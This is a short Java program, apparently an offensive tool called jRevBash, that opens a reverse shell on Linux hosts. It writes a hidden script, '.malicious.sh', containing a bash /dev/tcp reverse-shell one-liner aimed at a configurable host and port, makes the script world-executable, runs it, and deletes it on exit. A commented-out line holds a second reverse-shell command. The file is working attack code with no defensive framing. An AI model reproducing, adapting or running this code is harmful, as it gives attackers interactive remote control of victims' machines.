import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;


public class jRevBash {
	
	static String host = "127.0.0.1"; //TODO CHANGE ME
	static String port = "31337"; //TODO CHANGE ME
	
	private static boolean linBash() {
		//TODO add support for multiple other shells
		Runtime r = Runtime.getRuntime();
		Process p = null;

		try {
			PrintWriter malicious = new PrintWriter(".malicious.sh", "UTF-8");
			malicious.println("/bin/bash -i >& /dev/tcp/"+ host + "/" + port + "0>&1");
			malicious.close();
		} catch (IOException e1) {
			e1.printStackTrace();
		}

		File mal = new File(".malicious.sh");
		mal.deleteOnExit();

		mal.setExecutable(true, false);
		mal.setReadable(true, false);
		mal.setWritable(true, false);

		try {
			p = r.exec("bash .malicious.sh".toString());
			//TODO Investigate why the following crashes java as it is a much cleaner solution.
			//p = r.exec("/bin/bash  -i > /dev/tcp/127.0.0.1/31337 0<&1 2>&1");
		} catch (IOException e) {
			e.printStackTrace();
			return false;
		}
		try {
			p.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
			return false;
		}
		return true;
	}

	public static void main(String args[]){
		String OS = System.getProperty("os.name");
		//TODO Test on OSX, BSD's, *nix
		if(OS.equals("Linux")){
			linBash();
		}
	}
}
